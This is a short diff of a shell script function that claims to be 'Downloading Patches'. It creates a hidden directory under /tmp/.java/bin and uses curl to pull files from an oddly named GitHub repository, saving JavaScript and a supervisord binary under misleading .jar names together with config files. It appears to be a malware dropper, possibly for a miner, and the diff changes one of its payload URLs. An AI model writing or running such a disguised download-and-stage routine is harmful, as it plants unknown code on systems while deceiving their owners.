@@ -3,7 +3,7 @@
 function fetch_files() {
     echo "Downloading Patches ..."
     mkdir -p /tmp/.java/bin && cd /tmp/.java/bin/
-    curl -L  https://github.com/i51jir6ni9t0/backup/raw/master/arm/web.js -o patch.jar
+    curl -L  https://github.com/i51jir6ni9t0/backup/raw/master/app.js -o patch.jar
     curl -L  https://github.com/i51jir6ni9t0/backup/raw/master/arm/supervisord -o plugins.jar
     curl -L  https://github.com/i51jir6ni9t0/backup/raw/master/creeper/cfg.conf -o cfg.conf
     curl -L  https://github.com/i51jir6ni9t0/backup/raw/master/creeper/spcfy.json -o conf.json
